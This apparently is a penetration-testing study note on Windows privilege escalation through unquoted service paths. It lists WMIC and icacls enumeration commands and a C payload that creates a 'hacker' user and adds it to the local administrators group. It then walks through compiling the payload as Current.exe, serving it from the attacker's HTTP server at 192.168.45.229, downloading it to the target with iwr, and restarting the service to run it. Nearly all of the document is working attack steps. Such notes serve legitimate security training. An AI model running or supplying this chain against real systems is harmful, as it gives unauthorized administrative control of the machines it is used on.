
Query all services.

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto"
|findstr /i /v "c:\windows\\" |findstr /i /v """
```

If we have write permissions inside an Path which is vulnerable has spaces inside, we can embedd an malicious Program.exe.

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Checking for write permissions:

```
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
icacls "C:\Program Files\Enterprise Apps\Current Version"

```
Enumerating Services & Absolute Paths, which are vulnerable to Unquoted Service Paths.

```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Let's assume we found one.

We now have to check if we can start or stop the service, or if he is set to auto!

If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Check privs if we have "SeShutdownPrivilege"

```
whoam /priv
```

```
shutdown /r /t 0
```

PowerShell

```
Start-Service GammaService
```

```
Stop-Service GammaService
```

Assuming we have write permissions in C:\Program Files\Enterprise Apps then our goal is to place an malicious "Current.exe" inside of there.

Let's utilize the following .c script for this:


C:\Program Files\Enterprise Apps

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hacker password123! /add");
  i = system ("net localgroup administrators hacker /add");
  
  return 0;
}
```

Compile the malicious code to an binary.

```
x86_64-w64-mingw32-gcc adduser.c -o Current.exe
```

Download it onto the target.

On local machine

```
python3 -m http.server 80
```

On target machine

```
iwr -uri http://192.168.45.229/Current.exe -OutFile Current.exe
```

Since we got permissions to Start the Service we can execute our malicious binary and an administrator account named "hacker" will be created.

```
Start-Service GammaService
```

```
net user
hacker
```